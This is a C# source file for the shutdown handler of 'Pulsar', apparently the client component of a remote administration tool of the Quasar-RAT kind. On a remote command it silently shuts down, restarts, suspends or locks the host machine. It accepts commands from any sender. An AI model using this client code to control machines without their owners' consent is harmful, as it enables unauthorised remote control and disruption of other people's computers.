using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ShutdownHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShutdownAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShutdownAction msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoShutdownAction message)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                switch (message.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.FileName = "shutdown";
                        startInfo.Arguments = "/s /t 0"; // shutdown immediately
                        Process.Start(startInfo);
                        break;

                    case ShutdownAction.Restart:
                        startInfo.FileName = "shutdown";
                        startInfo.Arguments = "/r /t 0"; // restart immediately
                        Process.Start(startInfo);
                        break;

                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // sleep/standby
                        break;

                    case ShutdownAction.Lockscreen:
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "rundll32.exe",
                            Arguments = "user32.dll,LockWorkStation",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        break;

                    default:
                        client.Send(new SetStatus { Message = "Unknown shutdown action." });
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Action failed: {ex.Message}" });
            }
        }
    }
}
